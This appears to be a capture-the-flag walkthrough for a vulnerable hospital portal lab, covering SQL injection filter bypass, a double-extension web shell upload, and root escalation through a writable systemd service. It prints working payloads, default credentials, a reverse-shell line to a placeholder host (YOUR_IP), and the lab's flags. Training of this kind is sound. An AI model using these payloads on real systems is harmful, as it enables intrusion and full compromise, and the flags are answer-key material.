# Walkthrough: Saint Mary's Clinic - Hospital Portal Lab

This lab is a multi-stage challenge that covers common web vulnerabilities and Linux privilege escalation via service misconfiguration.

## Stage 1: Reconnaissance & SQL Injection

**Objective:** Extract the hidden flag from the database.

1.  Navigate to the **Appointment Status** page reachable from the login screen.
2.  Test for SQL injection in the `id` parameter. Note that the application has a basic "SecureGuard" filter.
3.  Bypass the filter using versioned comments or other obfuscation techniques. 
    - **Payload:** `1 /*!50000UNION*/ SELECT 1,2,3,4,5--` (or similar)
4.  Identify the `secret_flags` table and extract the first flag.
    - **Flag:** `VulnOS{SQLi_D4t4_Exf1l}`

## Stage 2: Gaining a Foothold (File Upload Bypass)

**Objective:** Obtain a web shell as `www-data`.

1.  Log in as a doctor (credentials can be found via SQLi or using `dr_house` / `house`).
2.  Navigate to the **Profile Picture Upload** section.
3.  Attempt to upload a PHP shell. Observe the `.jpg` extension requirement.
4.  Bypass the restriction by leveraging the server's misconfiguration that processes double extensions.
    - **Filename:** `shell.php.jpg`
5.  Access your shell at `/uploads/shell.php.jpg` and locate the second flag.
    - **Path:** `/var/www/flag_stage2.txt`
    - **Flag:** `VulnOS{W3b_Sh3ll_Acc3ss}`

## Stage 3: Privilege Escalation (Service Misconfiguration)

**Objective:** Escalate to root.

1.  Check for background processes or interesting services. Notice `hospital-monitor.service`.
2.  Enumerate the permissions of service files in `/etc/systemd/system/`.
3.  Identify that `hospital-monitor.service` is writable by the `www-data` user.
4.  Modify the service to execute a malicious command.
    - **Command:** `echo -e "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'" >> /etc/systemd/system/hospital-monitor.service`
5.  Restart the service using your sudoer permission (allowed without a password).
    - **Command:** `sudo /usr/bin/systemctl restart hospital-monitor`
6.  Catch the shell and read the final flag as root.
    - **Path:** `/root/flag_stage3.txt`
    - **Flag:** `VulnOS{R00t_Pr1v1l3g3_Escalation}`


